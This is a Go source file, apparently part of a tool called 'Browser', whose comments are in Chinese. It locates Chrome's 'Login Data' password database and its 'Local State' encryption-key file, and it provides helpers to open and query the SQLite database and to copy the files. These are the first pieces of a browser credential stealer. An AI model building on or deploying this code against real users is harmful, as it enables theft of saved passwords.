package core

import (
	"Browser/data"
	"database/sql"
	"fmt"
	_ "github.com/mattn/go-sqlite3" // 添加sqlite3驱动
	"io"
	"os"
)

func ReturnChrome() string{
	// 返回默认的谷歌浏览器存储用户数据的sqlite3数据库
	return data.Env + `\AppData\Local\Google\Chrome\User Data\Default\Login Data`
}
func RetrunChromeState() string {
	// 返回默认的谷歌浏览器存储用户数据加密方式的文件路径
	return data.Env + `\AppData\Local\Google\Chrome\User Data\Local State`
}
func ConnSQLite(SQLiteRoot string) *sql.DB{
	// 连接sqlite数据库
	conn, err := sql.Open(data.SQLiteName,SQLiteRoot)
	if err != nil {
		fmt.Println("Can't find Chrome Browser SQLite data")
		return nil
	}
	return conn
}

func QuerySQLite(db *sql.DB,query string) *sql.Rows{
	// 返回查询结果rows
	rows, err := db.Query(query)
	if err != nil {
		fmt.Println("Can't Query Chrome data in SQLite data")
		return nil
	}
	return rows
}

func CopyFile(source , dest string)bool{
	if source == ""||dest == "" {
		fmt.Println("souce or dest is nill")
		return false
	}
	// 打开源地址文件
	source_open, err := os.Open(source)
	if err != nil {
		return false
	}
	defer source_open.Close()
	// 打开目的地址文件
	dest_open, err := os.OpenFile(dest, os.O_CREATE|os.O_WRONLY, 644)
	if err != nil {
		return false
	}
	defer dest_open.Close()

	_, copy_err := io.Copy(dest_open,source_open)
	if copy_err != nil{
		return false
	}else{
		return true
	}
}
